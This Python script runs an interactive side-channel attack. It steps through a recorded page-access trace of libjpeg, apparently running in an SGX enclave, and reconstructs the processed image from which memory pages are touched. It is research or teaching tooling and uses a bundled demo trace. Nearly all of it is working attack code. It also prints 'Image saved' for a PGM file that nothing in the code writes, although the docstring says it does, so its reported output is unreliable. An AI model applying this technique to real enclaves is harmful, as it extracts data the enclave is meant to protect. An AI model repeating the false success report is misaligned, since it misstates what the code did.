
"""
JPEG Attack with TraceNavigator (Interactive)
--------------------------------------------

Purpose:
    Interactive JPEG attack script using TraceNavigator to step through the trace
    and manually drive the JPEG state machine. Useful for debugging, educational
    purposes, or inspecting the state machine's evolution.

Workflow:
    - Loads the VCD trace and configures page ranges.
    - Sets breakpoints for all relevant pages using TraceNavigator.
    - Steps through the trace, updating the JPEG state machine only when a breakpoint is hit.
    - Reconstructs the image block-by-block as the state machine transitions.
    - Saves the reconstructed image as PGM and also as a PNG preview for easy viewing.
    - Prints detailed progress and output file locations.

Use case:
    Best for debugging, fine-grained analysis, or when you want to see exactly how
    the state machine evolves during the attack.
"""

from sgxtrace import TraceNavigator, load_vcd_trace
from sgxtrace.jpeg import JpegAttackConfig, JpegAttackResult, JpegReconstruction, JpegState

TRACE_PATH = "traces/trace_libjpeg.vcd"
OUTPUT_IMAGE = "output/jpeg_reconstruction_navigator.pgm"


def build_default_config() -> JpegAttackConfig:
    """Return the page ranges tuned for the bundled libjpeg demo trace."""
    return JpegAttackConfig(
        start_range=range(54, 55),
        next_row_range=range(44, 45),
        start_row_range=range(58, 59),
        pre_idct_slow_range=range(56, 57),
        idct_slow_range=range(62, 64),
        data_count_range_no_aexnotify=range(154, 157),
        num_colors=1,
        aexnotify=False,
    )


def run_jpeg_attack_with_navigator(trace_path: str = TRACE_PATH) -> JpegAttackResult:
    """Run the JPEG attack by manually driving the navigator."""
    print("--- JPEG RECONSTRUCTION ATTACK (Navigator) ---")

    trace = load_vcd_trace(trace_path)
    config = build_default_config()
    nav = TraceNavigator(trace)
    reconstruction = JpegReconstruction(num_colors=config.num_colors)

    interesting_pages: set[str] = set()
    for state in JpegState:
        for page_num in config.pages_for_state(state):
            page_name = f"_{page_num}"
            nav.add_breakpoint(page_name)
            interesting_pages.add(page_name)

    print(f"Configured {len(interesting_pages)} page breakpoints.")

    state = JpegState.PRE_START
    data_counter = 0
    processed_pages = 0

    while True:
        result = nav.page_step()
        if result.end_of_trace:
            break
        if result.breakpoint_hit is None:
            continue

        page_number = int(result.breakpoint_hit[1:])
        previous_state = state
        new_state = config.next_state(state, page_number)

        if previous_state == JpegState.IDCT_SLOW and new_state == JpegState.DATA_COUNT:
            data_counter = 1
        elif previous_state == JpegState.DATA_COUNT and new_state == JpegState.DATA_COUNT:
            data_counter += 1

        reconstruction.reconstruct_transition(previous_state, new_state, data_counter)

        if previous_state == JpegState.DATA_COUNT and new_state != JpegState.DATA_COUNT:
            data_counter = 0

        state = new_state
        processed_pages += 1

        if processed_pages % 1000 == 0:
            print(f"Processed {processed_pages} breakpoints, current state: {state.value}")

    if state == JpegState.DATA_COUNT and data_counter > 0:
        reconstruction.reconstruct_block(data_counter)

    attack_result = JpegAttackResult(
        config=config,
        reconstruction=reconstruction,
        final_state=state,
        processed_pages=processed_pages,
    )

    # Also save a PNG preview for easy viewing
    OUTPUT_PNG = "output/jpeg_reconstruction_navigator.png"
    try:
        attack_result.reconstruction.save_png_preview(OUTPUT_PNG, scale=16)
        print(f"PNG preview saved:     {OUTPUT_PNG}")
    except Exception as e:
        print(f"Could not save PNG preview: {e}")

    width, height = reconstruction.reconstructed_size()
    print(f"Processed breakpoints: {processed_pages}")
    print(f"Final state:           {state.value}")
    print(f"Image size:            {width} x {height} blocks")
    print(f"Image saved:           {OUTPUT_IMAGE}")
    print(f"Min data count:        {reconstruction.min_data}")
    print(f"Max data count:        {reconstruction.max_data}")

    return attack_result


if __name__ == "__main__":
    run_jpeg_attack_with_navigator()